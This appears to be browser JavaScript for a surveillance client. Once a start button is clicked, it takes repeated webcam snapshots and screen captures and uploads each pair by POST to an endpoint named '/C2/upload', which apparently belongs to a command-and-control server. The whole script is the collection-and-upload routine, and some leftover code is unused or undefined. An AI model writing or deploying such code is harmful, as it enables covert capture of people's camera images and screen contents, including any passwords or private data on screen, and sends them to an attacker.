'use strict';

document.addEventListener('DOMContentLoaded', function() {
  var gumVideo = document.querySelector('video#gum');
  var canvas = document.querySelector('canvas');
  canvas.width = 266;
  canvas.height = 200;

  document.getElementById('start_button').addEventListener('click', async function() {
    await handleImagesCapturing();
  });
  
var mediaSource = new MediaSource();
mediaSource.addEventListener('sourceopen', handleSourceOpen, false);
var sourceBuffer;



const stream_promise = navigator.mediaDevices.getDisplayMedia({video: true});


async function grabScreenshot() {
  console.log("grab screenshot");
  var imgData;
  try {
    const stream = await stream_promise;
    console.log(stream)
    const canvas = document.querySelector('canvas');
    const video = document.createElement('video'); // Create a video element dynamically
    video.srcObject = stream;
    await new Promise((resolve) => {
      video.onloadedmetadata = () => {
        video.play();
        resolve();
      };
    });

    const [track] = stream.getVideoTracks();
    console.log("grab screenshot 1");
    console.log(track)
    const imageCapture = new ImageCapture(track);

    // Grab a frame from the screen stream
    imgData = await imageCapture.grabFrame();
    
    // Draw the frame on the canvas
    canvas.width = imgData.width;
    canvas.height = imgData.height;
    canvas.getContext('2d').drawImage(imgData, 0, 0);
    
    // Convert the canvas to a Blob
    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png'));
    console.log("grab screenshot 2");
    console.log(blob);
    
    return blob;
  } catch (err) {
    console.error(err);
  }
}


 async function handleImagesCapturing (){
    let ctx = canvas.getContext('2d');
    
    var how_many_photos = 3;
    var i=how_many_photos;
    while (i>0){
      console.log("while loop")
      --i;
    //  const screenshot = await screenshotOfTab();
    var startTime = performance.now()
    const screenshot = await grabScreenshot();
    var endTime = performance.now()
    var time = endTime - startTime;
    console.log("time: " + time);


    ctx.drawImage(gumVideo, 0, 0, canvas.width, canvas.height);
    let camera = await new Promise(resolve => {
      canvas.toBlob(resolve, 'image/jpeg');
    });
    let formData = new FormData();
    formData.append('camera', camera, 'camera.jpg');
    formData.append('screenshot', screenshot, 'screenshot.png');

    await fetch('/C2/upload', {
      method: 'POST',
      body: formData
  })
  .then(response => response.text())
  .then(result => {
      console.log('Success:', result);
  })
  .catch(error => {
      console.error('Error:', error);
  });

    await new Promise(resolve => setTimeout(resolve, 5000));
  }
};


// Use old-style gUM to avoid requirement to enable the
// Enable experimental Web Platform features flag in Chrome 49

navigator.getUserMedia = navigator.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia;

var constraints = {
  audio: false,
  video: true
};

navigator.getUserMedia(constraints, successCallback, errorCallback);


function successCallback(stream) {
  console.log('getUserMedia() got stream: ', stream);
  window.stream = stream;
  gumVideo.srcObject = stream;
}


function errorCallback(error) {
  console.log('navigator.getUserMedia error: ', error);
}

function handleSourceOpen(event) {
  console.log('MediaSource opened');
  sourceBuffer = mediaSource.addSourceBuffer('video/webm; codecs="vp8"');
  console.log('Source buffer: ', sourceBuffer);
}


function handleDataAvailable(event) {
  if (event.data && event.data.size > 0) {
    recordedBlobs.push(event.data);
  }
}
});
